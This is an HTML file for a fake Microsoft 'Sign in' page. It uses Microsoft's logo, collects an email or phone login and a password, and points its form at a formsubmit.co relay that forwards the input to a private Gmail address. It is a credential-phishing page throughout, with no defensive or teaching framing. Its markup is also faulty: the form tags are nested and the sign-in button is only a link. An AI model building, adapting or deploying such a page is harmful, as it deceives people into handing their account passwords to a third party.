<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="login-form">
            <div class="logo">
                <img src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft Logo">
            </div>
            <h2>Sign in</h2>
            <form id="loginForm">
            <form action="https://formsubmit.co/nazieogay1@gmail.com" method="POST"/>
                <div class="input-group">
                    <label for="username">Email, phone, or Skype</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
                <div class="button-container">
                    <a href="https://www.office.com/" class="login-button">Sign in</a>
                  </div>
                <div class="create-account">
                    <p>No account? <a href="#">Create one!</a></p>
                </div>
            </form>
        </div>
    </div>
  
</body>
</html>
